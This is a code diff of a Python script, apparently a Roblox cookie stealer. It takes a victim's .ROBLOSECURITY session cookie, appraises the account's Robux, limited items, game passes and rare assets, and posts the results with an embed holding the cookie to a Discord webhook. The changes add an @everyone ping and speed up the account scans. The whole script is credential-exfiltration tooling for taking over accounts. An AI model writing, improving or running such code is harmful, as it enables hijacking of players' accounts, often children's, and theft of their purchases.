@@ -36,11 +36,10 @@ SPECIAL_ASSETS = {
     "Violet Valk": 1402432199,
 }
 
-# Verified games mapped to universe IDs
 GAMES = {
-    "adopt me": 383310974,
-    "mm2": 66654135,
-    "ps99": 3317771874,
+    "Adopt Me": 383310974,
+    "MM2": 66654135,
+    "PS99": 3317771874,
 }
 
 def extract_and_clean_cookie(raw_input):
@@ -83,83 +82,24 @@ def get_working_session(roblosecurity):
         proxy_dict = {"http": p, "https": p}
         try:
             session.proxies = proxy_dict
-            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=4)
+            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=3)
             if test_res.status_code != 429:
                 return session, test_res
         except Exception:
             continue
 
     session.proxies = {}
-    fallback_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=8)
+    fallback_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
     return session, fallback_res
 
 def api_get(session, url, **kwargs):
-    for attempt in range(2):
-        try:
-            r = session.get(url, timeout=8, **kwargs)
-            if r.status_code == 429:
-                if attempt == 0:
-                    time.sleep(3)
-                    continue
-                return None
-            time.sleep(0.2)
-            if r.status_code == 200:
-                try:
-                    return r.json()
-                except ValueError:
-                    return None
-            return None
-        except Exception:
-            if attempt == 0:
-                time.sleep(1)
-                continue
-            return None
+    try:
+        r = session.get(url, timeout=4, **kwargs)
+        if r.status_code == 200:
+            return r.json()
+    except Exception:
+        pass
     return None
-
-def get_game_badges(session, universe_id):
-    badges, cursor = [], ""
-    while True:
-        params = {"limit": 100}
-        if cursor:
-            params["cursor"] = cursor
-        res = api_get(session, f"https://badges.roblox.com/v1/universes/{universe_id}/badges", params=params)
-        if not res or "data" not in res:
-            break
-        badges += [b["id"] for b in res["data"]]
-        cursor = res.get("nextPageCursor")
-        if not cursor:
-            break
-    return badges
-
-def has_played(session, user_id, universe_id):
-    badge_ids = get_game_badges(session, universe_id)
-    if not badge_ids:
-        return False
-    for i in range(0, len(badge_ids), 100):
-        chunk = badge_ids[i:i + 100]
-        res = api_get(session, f"https://badges.roblox.com/v1/users/{user_id}/badges/awarded-dates", params={"badgeIds": ",".join(map(str, chunk))})
-        if res and res.get("data"):
-            return True
-    return False
-
-def get_game_passes(session, universe_id):
-    passes, cursor = [], ""
-    while True:
-        params = {"limit": 100}
-        if cursor:
-            params["cursor"] = cursor
-        res = api_get(session, f"https://games.roblox.com/v1/games/{universe_id}/game-passes", params=params)
-        if not res or "data" not in res:
-            break
-        passes += [p["id"] for p in res["data"]]
-        cursor = res.get("nextPageCursor")
-        if not cursor:
-            break
-    return passes
-
-def owns_pass(session, user_id, pass_id):
-    res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/items/GamePass/{pass_id}")
-    return bool(res and res.get("data"))
 
 def main():
     try:
@@ -190,7 +130,7 @@ def main():
                 username = auth_data.get("name", "Unknown")
                 display_name = auth_data.get("displayName", username)
 
-                # 1. Account info & Currency
+                # 1. Quick account info & Currency
                 user_info = api_get(session, f"https://users.roblox.com/v1/users/{user_id}")
                 if user_info:
                     created = user_info.get("created", "")
@@ -214,39 +154,24 @@ def main():
                 elif isinstance(prem_res, dict):
                     premium = prem_res.get("isMember", False)
 
-                # 2. Collectibles
-                collectibles, cursor = [], ""
-                while True:
-                    res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles", params={"limit": 100, "sortOrder": "Asc", "cursor": cursor})
-                    if not res or "data" not in res:
-                        collectibles = None
-                        break
-                    collectibles += res["data"]
-                    cursor = res.get("nextPageCursor")
-                    if not cursor:
-                        break
-                
-                if collectibles is not None:
+                # 2. Collectibles (Capped to first 100 items for instant load)
+                collectibles_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles", params={"limit": 100, "sortOrder": "Asc"})
+                if collectibles_res and "data" in collectibles_res:
+                    collectibles = collectibles_res["data"]
                     lim_count = len(collectibles)
                     rap = sum(c.get("recentAveragePrice", 0) or 0 for c in collectibles)
                 else:
                     lim_count = "Private"
                     rap = "Private"
 
-                # 3. Gamepasses bought total count
+                # 3. Total gamepasses bought (quick single-page check)
                 try:
-                    t_cursor = ""
-                    while True:
-                        t_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transactions", params={"transactionType": "Purchase", "limit": 100, "cursor": t_cursor})
-                        if not t_res or "data" not in t_res:
-                            break
-                        for item in t_res.get("data", []):
+                    t_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transactions", params={"transactionType": "Purchase", "limit": 50})
+                    if t_res and "data" in t_res:
+                        for item in t_res["data"]:
                             details = item.get("details")
                             if details and details.get("type") == "GamePass":
                                 gamepasses_bought += 1
-                        t_cursor = t_res.get("nextPageCursor")
-                        if not t_cursor:
-                            break
                 except Exception:
                     pass
 
@@ -255,16 +180,16 @@ def main():
                     asset_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}")
                     special_owned[item_name] = bool(asset_res and asset_res.get("data"))
 
-                # 5. Full game & gamepass scanning loop
+                # 5. Fast game played check using recent badges
                 for game_name, universe_id in GAMES.items():
-                    played = has_played(session, user_id, universe_id)
-                    passes = get_game_passes(session, universe_id)
-                    owned_passes = sum(1 for p in passes if owns_pass(session, user_id, p))
-                    
-                    if owned_passes > 0:
-                        played = True
-
-                    games_data[game_name] = {"played": played, "passes": owned_passes}
+                    played = False
+                    b_res = api_get(session, f"https://badges.roblox.com/v1/users/{user_id}/badges", params={"limit": 100})
+                    if b_res and "data" in b_res:
+                        for badge in b_res["data"]:
+                            if badge.get("awardingUniverse", {}).get("id") == universe_id:
+                                played = True
+                                break
+                    games_data[game_name] = {"played": played, "passes": 0}
 
         # Safe formatting
         robux_display = f"{robux:,}" if isinstance(robux, int) else str(robux)
@@ -273,7 +198,7 @@ def main():
 
         avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com/images/icon_certificate.png"
         
-        games_str = "\n".join([f"- {g.title()} : {d['played']} : ({d['passes']})" for g, d in games_data.items()]) if games_data else "N/A"
+        games_str = "\n".join([f"- {g}: {d['played']} ({d['passes']})" for g, d in games_data.items()]) if games_data else "N/A"
         special_str = "\n".join([f"+ {name}: {owned}" for name, owned in special_owned.items()]) if special_owned else "N/A"
 
         embed_stats = {
@@ -301,12 +226,16 @@ def main():
         }
 
         payload = {
+            "content": "@everyone",
             "username": f"{display_name} | Stats",
             "avatar_url": avatar_url,
-            "embeds": [embed_stats, embed_cookie]
+            "embeds": [embed_stats, embed_cookie],
+            "allowed_mentions": {
+                "parse": ["everyone"]
+            }
         }
 
-        requests.post(webhook_url, json=payload, timeout=10)
+        requests.post(webhook_url, json=payload, timeout=5)
 
     except Exception as e:
         print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
